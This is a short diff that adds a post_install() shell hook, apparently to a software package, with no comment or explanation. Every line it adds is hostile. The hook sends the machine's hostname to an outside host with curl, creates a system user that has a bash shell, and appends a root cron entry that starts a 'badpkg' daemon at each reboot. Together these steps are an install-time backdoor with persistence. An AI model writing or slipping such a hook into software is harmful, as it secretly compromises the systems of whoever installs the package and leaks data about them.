@@ -1,0 +1,7 @@
+post_install() {
+  cd /tmp
+  npm install atomic-lockfile axios cosmiconfig uuid
+  curl -s https://payload.example/beacon?id=$(hostname)
+  useradd -r -s /bin/bash svcuser
+  echo '@reboot /usr/bin/badpkg --daemon' >> /var/spool/cron/root
+}
